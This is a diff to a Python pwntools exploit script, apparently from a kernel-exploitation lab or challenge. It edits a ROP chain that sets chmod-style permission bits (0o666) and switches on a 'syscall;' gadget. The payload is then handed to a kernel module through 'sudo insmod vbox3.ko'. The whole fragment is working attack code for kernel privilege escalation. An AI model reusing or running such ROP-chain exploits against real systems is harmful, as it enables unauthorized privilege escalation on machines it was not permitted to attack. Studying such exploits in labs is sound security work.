@@ -151,8 +151,8 @@ def build(leak, gadget_file, sled_length):
     # set rsi
     rop.raw(0o666)
     # syscall; NULL
-    # rop.raw(adjuster(gadget('syscall;', gadget_file)))
-    rop.raw(0x0)
+    rop.raw(adjuster(gadget('syscall;', gadget_file)))
+    # rop.raw(0x0)
     # sys_chmod
     # rop.raw(adjuster(chmod_addr()))
 
@@ -189,7 +189,7 @@ def attack_kernel(target_binary, payload_file, sled_length):
     args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
         'exploit_length="'+str(exploit_length)+'"']
     print(args)
-    print(process(args).recvall())
+    # print(process(args).recvall())
 
 def main():
     # Set the pwntools context
